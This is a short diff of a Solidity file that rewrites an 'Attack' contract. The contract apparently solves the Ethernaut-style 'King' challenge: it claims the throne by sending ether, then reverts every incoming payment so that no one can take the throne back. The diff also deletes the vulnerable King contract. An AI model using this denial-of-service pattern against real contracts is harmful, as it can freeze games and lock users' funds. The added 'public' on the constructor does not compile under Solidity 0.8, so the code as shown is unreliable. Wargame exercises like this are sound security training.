@@ -2,32 +2,11 @@
 pragma solidity ^0.8.0;
 
 contract Attack {
-    constructor (address payable _kingContract) payable {
-        _kingContract.call{value: msg.value}("")
-        
-    }
-}
-
-contract King {
-
-  address king;
-  uint public prize;
-  address public owner;
-
-  constructor() payable {
-    owner = msg.sender;  
-    king = msg.sender;
-    prize = msg.value;
+  constructor(address _kingAddress) public payable {
+    address(_kingAddress).call{value: msg.value}("");
   }
 
-  receive() external payable {
-    require(msg.value >= prize || msg.sender == owner);
-    payable(king).transfer(msg.value);
-    king = msg.sender;
-    prize = msg.value;
-  }
-
-  function _king() public view returns (address) {
-    return king;
+  fallback() external payable {
+    revert();
   }
 }
